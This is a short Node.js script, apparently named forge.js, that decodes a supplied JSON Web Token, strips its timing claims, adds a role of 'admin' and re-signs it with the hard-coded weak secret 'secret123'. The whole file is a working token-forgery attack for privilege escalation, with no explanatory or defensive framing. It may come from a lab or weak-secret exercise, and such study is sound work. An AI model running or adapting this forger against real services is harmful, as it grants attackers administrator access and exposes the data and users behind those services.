
const jwt = require("jsonwebtoken");

const originalToken = process.argv[2];

if (!originalToken) {
  console.error("Usage: node forge.js <original-token>");
  process.exit(1);
}

const payload = jwt.decode(originalToken);

if (!payload || !payload.sub) {
  console.error("Invalid token payload");
  process.exit(1);
}

const { iat, exp, nbf, ...claims } = payload;

const knownWeakSecret = "secret123";

const forgedToken = jwt.sign(
  {
    ...claims,
    role: "admin",
  },
  knownWeakSecret,
  {
    algorithm: "HS256",
    expiresIn: "15m",
  }
);

console.log(forgedToken);
